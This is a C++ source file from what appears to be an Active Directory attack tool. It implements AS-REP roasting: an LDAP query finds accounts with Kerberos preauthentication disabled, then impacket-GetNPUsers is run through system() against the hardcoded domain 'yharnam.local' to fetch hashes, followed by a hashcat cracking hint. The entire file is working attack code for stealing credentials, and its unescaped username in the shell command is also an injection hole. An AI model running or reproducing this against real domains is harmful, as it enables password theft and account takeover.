#include <iostream>
#include "Attacks.h"
#include "../connections/LDAPConnection.h"
#include "../utils/Colors.h"
#include <vector>
#include <string>
#include "../utils/Colors.h"

Attacks::ASREPRoast::ASREPRoast(LDAPConnection& _conn) : conn(_conn) {}

std::vector<std::string>  Attacks::ASREPRoast::listUser(const std::string& baseDN) {
    std::cout << Colors::COLOR_YELLOW << "[*] Enumerating asreproastable users" << Colors::COLOR_RESET << std::endl;

    std::vector<std::string> asreproast_user;
    std::string query = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
    std::vector<std::string> attrs = {"sAMAccountName"};

    auto results = conn.executeQuery(baseDN, query, attrs);

    for (const auto& userObject : results) {
        auto user = userObject.find("sAMAccountName");
        if (user != userObject.end()) {
            std::string username = user->second.front();
            std::cout << "  [+] User: " << username << std::endl;
            asreproast_user.push_back(username);
        }
    }
    return asreproast_user;
}

bool Attacks::ASREPRoast::requestTicket(const std::string& vuln_user) {
    std::cout << Colors::COLOR_YELLOW << "\n[*] Requesting AS-REP ticket for: " << vuln_user  << Colors::COLOR_RESET << std::endl;

    std::string cmd = "impacket-GetNPUsers yharnam.local/" + vuln_user + " -no-pass -request -format hashcat";

    int result = system(cmd.c_str());

    if (result == 0) {
        std::cout << Colors::COLOR_GREEN << "  [+] Hash for " << vuln_user << " successfully retrieved" << Colors::COLOR_RESET << std::endl;
        std::cout << "  [*] To crack, run: hashcat -m 18200 hash /path/to/wordlist.txt" << std::endl;
        return true;
    } else {
        std::cerr << "  [-] Failed to request ticket for " << vuln_user << ". Is impacket-GetNPUsers in your PATH?" << std::endl;
        return false;
    }
}